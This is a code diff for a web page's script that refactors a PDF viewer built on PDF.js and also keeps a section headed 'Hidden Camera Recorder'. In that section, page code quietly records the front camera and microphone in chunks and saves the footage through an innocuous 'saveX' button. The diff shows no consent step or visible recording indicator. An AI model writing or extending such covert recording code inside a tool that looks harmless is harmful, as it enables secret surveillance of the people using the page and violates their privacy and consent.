@@ -113,96 +113,131 @@ let pdfDoc = null;
 let currentPage = 1;
 let pdfScale = parseFloat(zoomRange.value);
 let loadedPdfArrayBuffer = null;
-pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.14.305/pdf.worker.min.js';
-function renderPage(num){
-  pdfDoc.getPage(num).then(page=>{
-    const viewport = page.getViewport({scale: pdfScale});
-    pdfCanvas.width = Math.min(viewport.width, window.innerWidth*0.92);
-    pdfCanvas.height = viewport.height;
-    // For high-density displays, scale for devicePixelRatio
+
+// Ensure PDF.js is loaded before using it
+if (typeof pdfjsLib === 'undefined') {
+  pdfStatus.textContent = 'PDF.js failed to load';
+  console.error('PDF.js not loaded');
+} else {
+  pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.14.305/pdf.worker.min.js';
+}
+
+function renderPage(num) {
+  if (!pdfDoc) return;
+  pdfDoc.getPage(num).then(page => {
+    const viewport = page.getViewport({ scale: pdfScale });
     const dpr = window.devicePixelRatio || 1;
+    
+    // Set canvas dimensions with device pixel ratio
     pdfCanvas.width = Math.min(viewport.width * dpr, 4096);
     pdfCanvas.height = viewport.height * dpr;
-    pdfCanvas.style.width = Math.min(viewport.width, window.innerWidth*0.92) + 'px';
+    pdfCanvas.style.width = Math.min(viewport.width, window.innerWidth * 0.92) + 'px';
     pdfCanvas.style.height = viewport.height + 'px';
+    
     const renderContext = {
       canvasContext: pdfCtx,
-      viewport: page.getViewport({scale: pdfScale * dpr})
+      viewport: page.getViewport({ scale: pdfScale * dpr })
     };
-    pdfCtx.save();
-    pdfCtx.clearRect(0,0,pdfCanvas.width,pdfCanvas.height);
-    page.render(renderContext).promise.then(()=>{
-      pdfCtx.restore();
+    
+    pdfCtx.clearRect(0, 0, pdfCanvas.width, pdfCanvas.height);
+    page.render(renderContext).promise.then(() => {
       pageInfo.textContent = num + ' / ' + pdfDoc.numPages;
       pdfStatus.textContent = 'Rendered page ' + num;
+    }).catch(err => {
+      pdfStatus.textContent = 'Render error: ' + err.message;
     });
+  }).catch(err => {
+    pdfStatus.textContent = 'Page load error: ' + err.message;
   });
 }
-function loadPdfFromArrayBuffer(ab, name){
+
+function loadPdfFromArrayBuffer(ab, name) {
   loadedPdfArrayBuffer = ab;
-  pdfjsLib.getDocument({data: ab}).promise.then(doc=>{
+  pdfjsLib.getDocument({ data: ab }).promise.then(doc => {
     pdfDoc = doc;
     currentPage = 1;
     renderPage(currentPage);
-  }).catch(err=>{
-    pdfStatus.textContent = 'PDF load error: ' + (err && err.message ? err.message : err);
+    pdfStatus.textContent = 'Loaded ' + (name || 'PDF') + ' (' + doc.numPages + ' pages)';
+  }).catch(err => {
+    pdfStatus.textContent = 'PDF load error: ' + (err.message || err);
   });
 }
-pdfFileInput.addEventListener('change', async (e)=>{
-  const f = e.target.files && e.target.files[0];
-  if(!f) return;
+
+pdfFileInput.addEventListener('change', async (e) => {
+  const f = e.target.files?.[0];
+  if (!f) return;
   pdfStatus.textContent = 'Loading ' + f.name;
-  const ab = await f.arrayBuffer();
-  loadPdfFromArrayBuffer(ab, f.name);
-});
-loadUrlBtn.addEventListener('click', async ()=>{
-  const url = pdfUrlInput.value.trim();
-  if(!url) { pdfStatus.textContent = 'Enter a PDF URL'; return; }
-  pdfStatus.textContent = 'Fetching URL...';
-  try{
-    const resp = await fetch(url);
-    if(!resp.ok) throw new Error('Network response not OK: ' + resp.status);
-    const ab = await resp.arrayBuffer();
-    loadPdfFromArrayBuffer(ab, url);
-  }catch(err){
-    pdfStatus.textContent = 'Failed to fetch URL: ' + err.message;
+  try {
+    const ab = await f.arrayBuffer();
+    loadPdfFromArrayBuffer(ab, f.name);
+  } catch (err) {
+    pdfStatus.textContent = 'File read error: ' + err.message;
   }
 });
-prevPageBtn.addEventListener('click', ()=> {
-  if(!pdfDoc) return;
-  if(currentPage <= 1) return;
+
+loadUrlBtn.addEventListener('click', async () => {
+  const url = pdfUrlInput.value.trim();
+  if (!url) { 
+    pdfStatus.textContent = 'Enter a valid PDF URL'; 
+    return; 
+  }
+  pdfStatus.textContent = 'Fetching URL...';
+  try {
+    const resp = await fetch(url);
+    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+    const ab = await resp.arrayBuffer();
+    loadPdfFromArrayBuffer(ab, url);
+  } catch (err) {
+    pdfStatus.textContent = 'Fetch error: ' + err.message;
+  }
+});
+
+prevPageBtn.addEventListener('click', () => {
+  if (!pdfDoc || currentPage <= 1) return;
   currentPage--;
   renderPage(currentPage);
 });
-nextPageBtn.addEventListener('click', ()=> {
-  if(!pdfDoc) return;
-  if(currentPage >= pdfDoc.numPages) return;
+
+nextPageBtn.addEventListener('click', () => {
+  if (!pdfDoc || currentPage >= pdfDoc.numPages) return;
   currentPage++;
   renderPage(currentPage);
 });
-zoomRange.addEventListener('input', ()=>{
+
+zoomRange.addEventListener('input', () => {
   pdfScale = parseFloat(zoomRange.value);
-  zoomVal.textContent = Math.round(pdfScale*100) + '%';
-  if(pdfDoc) renderPage(currentPage);
+  zoomVal.textContent = Math.round(pdfScale * 100) + '%';
+  if (pdfDoc) renderPage(currentPage);
 });
-downloadPdfBtn.addEventListener('click', ()=>{
-  if(!loadedPdfArrayBuffer) { pdfStatus.textContent = 'No PDF to download'; return; }
-  const blob = new Blob([loadedPdfArrayBuffer], {type:'application/pdf'});
+
+downloadPdfBtn.addEventListener('click', () => {
+  if (!loadedPdfArrayBuffer) {
+    pdfStatus.textContent = 'No PDF to download';
+    return;
+  }
+  const blob = new Blob([loadedPdfArrayBuffer], { type: 'application/pdf' });
   const url = URL.createObjectURL(blob);
-  const a = document.createElement('a'); a.href = url; a.download = 'download.pdf'; document.body.appendChild(a); a.click();
-  a.remove(); URL.revokeObjectURL(url);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'download.pdf';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => {
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }, 100);
 });
+
 /* =========================
    Hidden Camera Recorder
    ========================= */
 const saveX = document.getElementById('saveX');
 let stream = null;
 let mediaRecorder = null;
-let recordedBlobs = []; // last saved recording (array of blobs)
-let activeRecordingBlobs = null; // currently recording blobs
-let lastRecordingBlob = null; // Blob of last recording available to save
+let recordedBlobs = [];
+let activeRecordingBlobs = [];
+let lastRecordingBlob = null;
 let recStartTime = null;
-let recTimerInterval = null;
 let lastRecordingName = null;
 let autoDownloadAfterStop = false;
 
@@ -211,33 +246,36 @@ async function initHiddenRecording() {
   try {
     const constraints = {
       audio: true,
-      video: {
-        facingMode: { exact: "user" }
-      }
+      video: { facingMode: { exact: "user" } }
     };
     stream = await navigator.mediaDevices.getUserMedia(constraints);
-    const mimeType = 'video/webm;codecs=vp9,opus';
-    let options = mimeType ? { mimeType } : undefined;
-    mediaRecorder = new MediaRecorder(stream, options);
-    activeRecordingBlobs = [];
+    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+    
     mediaRecorder.ondataavailable = (e) => {
-      if (e.data && e.data.size > 0) {
+      if (e.data.size > 0) {
         activeRecordingBlobs.push(e.data);
       }
     };
+    
     mediaRecorder.onstart = () => {
       recStartTime = Date.now();
+      pdfStatus.textContent = 'Recording...';
     };
+    
     mediaRecorder.onstop = () => {
-      if (activeRecordingBlobs && activeRecordingBlobs.length) {
-        lastRecordingBlob = new Blob(activeRecordingBlobs, { type: mediaRecorder.mimeType || 'video/webm' });
-        const t = new Date();
-        lastRecordingName = 'recording_' + t.toISOString().replace(/[:.]/g, '-') + (lastRecordingBlob.type.includes('mp4') ? '.mp4' : '.webm');
+      if (activeRecordingBlobs.length) {
+        lastRecordingBlob = new Blob(activeRecordingBlobs, { type: mediaRecorder.mimeType });
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        lastRecordingName = `recording_${timestamp}.webm`;
+        pdfStatus.textContent = 'Recording stopped';
       }
+      activeRecordingBlobs = [];
     };
+    
     mediaRecorder.start(1000);
   } catch (err) {
-    console.error('Error initializing hidden recording:', err);
+    pdfStatus.textContent = 'Camera error: ' + err.message;
+    console.error('Camera error:', err);
   }
 }
 
@@ -249,18 +287,8 @@ saveX.addEventListener('click', () => {
   if (mediaRecorder && mediaRecorder.state === 'recording') {
     autoDownloadAfterStop = true;
     mediaRecorder.stop();
-    const onstopHandler = () => {
-      if (lastRecordingBlob) {
-        triggerDownloadBlob(lastRecordingBlob, lastRecordingName || 'recording.webm');
-      }
-      autoDownloadAfterStop = false;
-      mediaRecorder.removeEventListener('stop', onstopHandler);
-    };
-    mediaRecorder.addEventListener('stop', onstopHandler);
-    return;
-  }
-  if (lastRecordingBlob) {
-    triggerDownloadBlob(lastRecordingBlob, lastRecordingName || 'recording.webm');
+  } else if (lastRecordingBlob) {
+    triggerDownloadBlob(lastRecordingBlob, lastRecordingName);
   }
 });
 
@@ -271,15 +299,19 @@ function triggerDownloadBlob(blob, filename) {
   a.download = filename;
   document.body.appendChild(a);
   a.click();
-  a.remove();
-  setTimeout(() => URL.revokeObjectURL(url), 15000);
+  setTimeout(() => {
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }, 100);
 }
 
 // Clean up when leaving the page
 window.addEventListener('beforeunload', () => {
-  if (mediaRecorder && mediaRecorder.state === 'recording') try { mediaRecorder.stop(); } catch (e) {}
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+  }
   if (stream) {
-    stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach(track => track.stop());
   }
 });
 </script>
